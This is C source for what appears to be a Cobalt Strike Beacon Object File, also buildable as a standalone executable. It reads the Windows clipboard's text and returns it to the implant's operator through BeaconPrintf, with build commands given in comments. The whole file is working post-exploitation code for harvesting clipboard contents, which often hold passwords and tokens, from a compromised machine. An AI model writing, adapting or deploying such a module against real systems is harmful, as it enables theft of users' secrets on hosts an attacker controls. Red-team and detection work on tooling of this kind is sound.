#include <windows.h>
#include <winuser.h>


#define cblimit 204800


// build
// x86_64-w64-mingw32-gcc -DBOF -c clipboard.c  -o clipboard.x64.o
// x86_64-w64-mingw32-strip --strip-unneeded clipboard.x64.o
// i686-w64-mingw32-gcc -DBOF -c clipboard.c -o clipboard.x86.o
// i686-w64-mingw32-strip --strip-unneeded clipboard.x86.o
// clang -s -w -O2 -static clipboard.c -o clipboard.x64.exe



size_t my_strlen(const char* str) {
	size_t len = 0;
	while (*str != '\0') {
		len++;
		str++;
	}
	return len;
}


#ifdef BOF

#include "beacon.h"

DECLSPEC_IMPORT WINUSERAPI BOOL WINAPI USER32$OpenClipboard(HWND);
DECLSPEC_IMPORT WINUSERAPI HANDLE WINAPI USER32$GetClipboardData(UINT);
DECLSPEC_IMPORT WINUSERAPI BOOL WINAPI USER32$CloseClipboard(void);
DECLSPEC_IMPORT WINBASEAPI LPVOID WINAPI KERNEL32$GlobalLock(HGLOBAL);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$GlobalUnlock(HGLOBAL);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(void);


#define OpenClipboard USER32$OpenClipboard
#define GetClipboardData USER32$GetClipboardData
#define CloseClipboard USER32$CloseClipboard
#define GlobalLock KERNEL32$GlobalLock
#define GlobalUnlock KERNEL32$GlobalUnlock
#define GetLastError KERNEL32$GetLastError

#endif


#ifdef BOF

void getclip()
{
   if (OpenClipboard(NULL))
    {

		HANDLE hData = GetClipboardData(CF_TEXT);
		if (hData)
		{
			char* Str = (char*)GlobalLock(hData);
			if (Str)
			{
				size_t length = my_strlen(Str);
				
				if (length <= cblimit)
				{
					BeaconPrintf(CALLBACK_OUTPUT_UTF8, "Clipboard Data (%lu bytes):\n%s\n", length, Str);
				}
				else
				{
					BeaconPrintf(CALLBACK_ERROR, "String exceeds limit: %lu > %d\n", length, cblimit);
				}
				GlobalUnlock(hData);
			}
			else
			{
				BeaconPrintf(CALLBACK_ERROR, "Failed to lock clipboard data: Error %lu\n", GetLastError());
			}
		}
		else
		{
			BeaconPrintf(CALLBACK_ERROR, "Failed to retrieve clipboard data: Error %lu\n", GetLastError());
		}

        CloseClipboard();
    }
    else
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to open clipboard: Error %lu\n", GetLastError());
    }
}

#else

#include <stdio.h>
	
int main()
{
    if (OpenClipboard(NULL))
    {

		HANDLE hData = GetClipboardData(CF_TEXT);
		if (hData)
		{
			char* Str = (char*)GlobalLock(hData);
			if (Str)
			{
				size_t length = my_strlen(Str);
				if (length <= cblimit)
				{
					printf("Clipboard Data (%lu bytes):\n%s\n", length, Str);
				}
				else
				{
					printf("String exceeds limit: %lu > %d\n", length, cblimit);
				}
				GlobalUnlock(hData);
			}
			else
			{
				printf("Failed to lock clipboard data: Error %lu\n", GetLastError());
			}
		}
		else
		{
			printf("Failed to retrieve clipboard data: Error %lu\n", GetLastError());
		}

        CloseClipboard();
    }
    else
    {
        printf("Failed to open clipboard: Error %lu\n", GetLastError());
    }
    return 0;
}


#endif
